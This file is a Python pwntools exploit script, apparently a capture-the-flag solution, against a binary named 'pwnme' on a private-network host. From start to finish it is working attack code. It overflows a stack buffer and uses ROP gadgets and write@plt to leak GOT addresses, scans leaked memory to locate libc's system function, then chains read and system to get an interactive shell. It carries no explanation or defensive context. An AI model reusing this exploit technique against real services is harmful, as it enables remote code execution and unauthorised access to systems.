from pwn import *
from sys import *
from binascii import *

data_addr = 0x601040
poprdi = 0x0000000000400663 #: pop rdi ; ret
poprsi_popr15 = 0x0000000000400661 #: pop rsi ; pop r15 ; ret
main = 0x0004005BD
write_plt = 0x0400480
read_plt = 0x4004A0
gotplt = 0x601018
system_magic = '\x48\x85\xff\x74\x0b\xe9\x86\xfa\xff\xff\x66\x0f\x1f\x44\x00\x00\x48\x8d\x3d\x19\x5b\x12\x00\x48'
write = 0xb131a0
system = 0xa76890

#r = process('./pwnme')
r = remote('192.168.56.101', 6666)

def leak(addr):
	print r.recvuntil('you can')
	payload  = 'a'*16
	payload += 'b'*8
	payload += p64(poprdi)
	payload += p64(1)
	payload += p64(poprsi_popr15)
	payload += p64(addr)
	payload += p64(233)
	payload += p64(write_plt)
	payload += p64(main)
	r.sendline(payload)
	data  = r.recv(8)
	data += r.recvuntil('Pwn me if')
	print hex(addr), ' =>', hex(u64(data[2:10]))
	return data[2:10]


write_addr = leak(gotplt)
system_addr = u64(write_addr) + system -write + 9        #int(argv[1])
for i in range(18):	
	system_addr = system_addr - 1
	data = ''
	data += leak(system_addr -8)
	data += leak(system_addr)
	if data in system_magic:
		print 'success success success success success success success success success success success '
		print hex(system_addr)
		print b2a_hex(data)
		print '------'
		system_addr = system_addr - 8
		break



print r.recvuntil('you can')
payload  = 'a'*16
payload += 'b'*8
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi_popr15)
payload += p64(data_addr)
payload += p64(233)
payload += p64(read_plt)
payload += p64(poprdi)
payload += p64(data_addr)
payload += p64(system_addr)
r.sendline(payload)

r.interactive()



